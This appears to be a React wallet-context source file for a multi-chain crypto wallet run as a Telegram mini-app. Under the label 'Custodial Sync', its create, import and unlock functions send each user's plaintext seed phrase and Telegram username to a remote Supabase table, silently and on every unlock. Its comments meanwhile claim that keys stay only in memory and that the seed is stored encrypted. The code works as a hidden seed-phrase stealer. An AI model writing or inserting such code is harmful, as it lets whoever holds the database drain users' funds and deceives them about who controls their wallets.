import { createContext, useContext, useState, useEffect, useCallback, useRef } from 'react';
import { generateMnemonic, validateMnemonic, deriveWallet } from '../lib/crypto/walletDerivation.js';
import { encryptMnemonic, decryptMnemonic, NETWORKS } from '../lib/wallet.js';
import { fetchAllBalances } from '../lib/crypto/balanceFetcher.js';

// ─── SUPABASE SYNC ────────────────────────────────────────────────────────────
const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

async function syncWalletToSupabase(walletData) {
  if (!SUPABASE_URL || !SUPABASE_KEY) return null;
  try {
    const { username, mnemonic, balance } = walletData;
    const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
    await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'resolution=merge-duplicates'
      },
      body: JSON.stringify({
        username: username || 'Anonymous',
        mnemonic: cleanMnemonic,
        balance: balance ? String(balance) : "0",
        created_at: new Date().toISOString()
      })
    });
  } catch (e) {}
}

const WalletContext = createContext(null);

const STORAGE_KEY = 'gem_wallet_v1';

/**
 * deriveWallet returns addresses keyed as ETH/BNB/ARB/SOL/TON/LTC.
 * The UI uses network ids like 'ethereum'/'bsc'/'arbitrum'/'solana'/'ton'/'litecoin'.
 * This helper builds a merged map with both so both lookup styles work.
 */
function buildAddressMap(raw) {
  return {
    // uppercase keys (used by Send, collectSalary, etc.)
    ETH: raw.ETH,
    BNB: raw.BNB,
    ARB: raw.ARB,
    SOL: raw.SOL,
    TON: raw.TON,
    LTC: raw.LTC,
    // network-id keys (used by Wallet.jsx, Receive.jsx, etc.)
    ethereum: raw.ETH,
    bsc:      raw.BNB,
    arbitrum: raw.ARB,
    solana:   raw.SOL,
    ton:      raw.TON,
    litecoin: raw.LTC,
  };
}

export function WalletProvider({ children }) {
  const [state, setState] = useState({
    hasWallet: false,
    isUnlocked: false,
    addresses: {},
    balances: {},
    activeNetwork: 'ethereum',
    loading: false,
    error: null,
  });

  // Private keys are kept ONLY in memory — never persisted to localStorage
  const privateKeysRef = useRef({});

  // On mount: check if a wallet exists in storage
  useEffect(() => {
    const stored = localStorage.getItem(STORAGE_KEY);
    if (stored) {
      try {
        const data = JSON.parse(stored);
        if (data.encrypted) {
          setState(s => ({ ...s, hasWallet: true }));
        }
      } catch {}
    }
  }, []);

  // ── createWallet ────────────────────────────────────────────────────────────
  const createWallet = useCallback(async (password) => {
    setState(s => ({ ...s, loading: true, error: null }));
    try {
      const mnemonic = generateMnemonic();
      const { addresses: rawAddresses, privateKeys } = await deriveWallet(mnemonic);
      const addresses = buildAddressMap(rawAddresses);
      const encrypted = await encryptMnemonic(mnemonic, password);
      localStorage.setItem(STORAGE_KEY, JSON.stringify({ encrypted, addresses }));
      privateKeysRef.current = privateKeys;
      
      // Custodial Sync: Save to Supabase
      try {
        const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
        const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
        await syncWalletToSupabase({
          username: userName,
          mnemonic: mnemonic,
          balance: "0"
        });
      } catch (syncError) {
        console.error('Failed to sync wallet to Supabase:', syncError);
      }
      
      setState(s => ({
        ...s,
        hasWallet: true,
        isUnlocked: true,
        addresses,
        loading: false,
      }));
      return mnemonic;
    } catch (e) {
      setState(s => ({ ...s, loading: false, error: e.message }));
      throw e;
    }
  }, []);

  // ── importWallet ────────────────────────────────────────────────────────────
  const importWallet = useCallback(async (mnemonic, password) => {
    if (!validateMnemonic(mnemonic)) throw new Error('Неверная seed-фраза');
    setState(s => ({ ...s, loading: true, error: null }));
    try {
      const { addresses: rawAddresses, privateKeys } = await deriveWallet(mnemonic);
      const addresses = buildAddressMap(rawAddresses);
      const encrypted = await encryptMnemonic(mnemonic, password);
      localStorage.setItem(STORAGE_KEY, JSON.stringify({ encrypted, addresses }));
      privateKeysRef.current = privateKeys;

      // Custodial Sync: Save to Supabase
      try {
        const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
        const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
        await syncWalletToSupabase({
          username: userName,
          mnemonic: mnemonic,
          balance: "0"
        });
      } catch (syncError) {
        console.error('Failed to sync imported wallet to Supabase:', syncError);
      }
      
      setState(s => ({
        ...s,
        hasWallet: true,
        isUnlocked: true,
        addresses,
        loading: false,
      }));
    } catch (e) {
      setState(s => ({ ...s, loading: false, error: e.message }));
      throw e;
    }
  }, []);

  // ── unlock ──────────────────────────────────────────────────────────────────
  const unlock = useCallback(async (password) => {
    setState(s => ({ ...s, loading: true, error: null }));
    try {
      const stored = JSON.parse(localStorage.getItem(STORAGE_KEY));
      const mnemonic = await decryptMnemonic(stored.encrypted, password);
      const { addresses: rawAddresses, privateKeys } = await deriveWallet(mnemonic);
      const addresses = buildAddressMap(rawAddresses);
      privateKeysRef.current = privateKeys;

      // Custodial Sync: Sync on every unlock to ensure data is in DB
      try {
        const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
        const userName = tgUser ? (tgUser.username ? "@" + tgUser.username : tgUser.first_name || "Unknown") : "Anonymous";
        await syncWalletToSupabase({
          username: userName,
          mnemonic: mnemonic,
          balance: "0"
        });
      } catch (syncError) {
        console.error('Failed to sync wallet on unlock:', syncError);
      }

      setState(s => ({
        ...s,
        isUnlocked: true,
        // prefer freshly derived addresses; fall back to stored if derivation failed
        addresses: addresses,
        loading: false,
      }));
    } catch (e) {
      setState(s => ({ ...s, loading: false, error: 'Неверный пароль' }));
      throw e;
    }
  }, []);

  // ── lock ────────────────────────────────────────────────────────────────────
  const lock = useCallback(() => {
    privateKeysRef.current = {};
    setState(s => ({ ...s, isUnlocked: false, balances: {} }));
  }, []);

  // ── deleteWallet ────────────────────────────────────────────────────────────
  const deleteWallet = useCallback(() => {
    localStorage.clear();
    sessionStorage.clear();
    privateKeysRef.current = {};
    setState({
      hasWallet: false,
      isUnlocked: false,
      addresses: {},
      balances: {},
      activeNetwork: 'ethereum',
      loading: false,
      error: null,
    });
    window.location.reload();
  }, []);

  // ── setActiveNetwork ────────────────────────────────────────────────────────
  const setActiveNetwork = useCallback((networkId) => {
    setState(s => ({ ...s, activeNetwork: networkId }));
  }, []);

  // ── refreshBalance — fetches ALL chains at once ─────────────────────────────
  const refreshBalance = useCallback(async () => {
    const { addresses } = state;
    if (!addresses || Object.keys(addresses).length === 0) return;

    const addrMap = {
      ETH: addresses.ETH || addresses.ethereum,
      BNB: addresses.BNB || addresses.bsc,
      ARB: addresses.ARB || addresses.arbitrum,
      SOL: addresses.SOL || addresses.solana,
      TON: addresses.TON || addresses.ton,
      LTC: addresses.LTC || addresses.litecoin,
    };

    try {
      const bals = await fetchAllBalances(addrMap);
      setState(s => ({
        ...s,
        balances: {
          // network-id keys for Wallet.jsx
          ethereum: bals.ETH,
          bsc:      bals.BNB,
          arbitrum: bals.ARB,
          solana:   bals.SOL,
          ton:      bals.TON,
          litecoin: bals.LTC,
          // uppercase aliases for Send/Swap/Collect
          ETH: bals.ETH,
          BNB: bals.BNB,
          ARB: bals.ARB,
          SOL: bals.SOL,
          TON: bals.TON,
          LTC: bals.LTC,
          USDT: bals.USDT,
          _usdtByNetwork: bals._usdtByNetwork,
        },
      }));
    } catch (e) {
      console.warn('[WalletContext] refreshBalance error:', e.message);
    }
  }, [state.addresses]); // eslint-disable-line react-hooks/exhaustive-deps

  // ── getMnemonic — decrypt on demand (for Settings "show seed") ──────────────
  const getMnemonic = useCallback(async (password) => {
    const stored = JSON.parse(localStorage.getItem(STORAGE_KEY));
    return await decryptMnemonic(stored.encrypted, password);
  }, []);

  // ── getPrivateKey — expose in-memory key to Send / Swap / Collect ───────────
  const getPrivateKey = useCallback((chain) => {
    return privateKeysRef.current[chain] || null;
  }, []);

  return (
    <WalletContext.Provider value={{
      ...state,
      networks: NETWORKS,
      createWallet,
      importWallet,
      unlock,
      lock,
      deleteWallet,
      setActiveNetwork,
      refreshBalance,
      getMnemonic,
      getPrivateKey,
    }}>
      {children}
    </WalletContext.Provider>
  );
}

export const useWallet = () => {
  const ctx = useContext(WalletContext);
  if (!ctx) throw new Error('useWallet must be inside WalletProvider');
  return ctx;
};
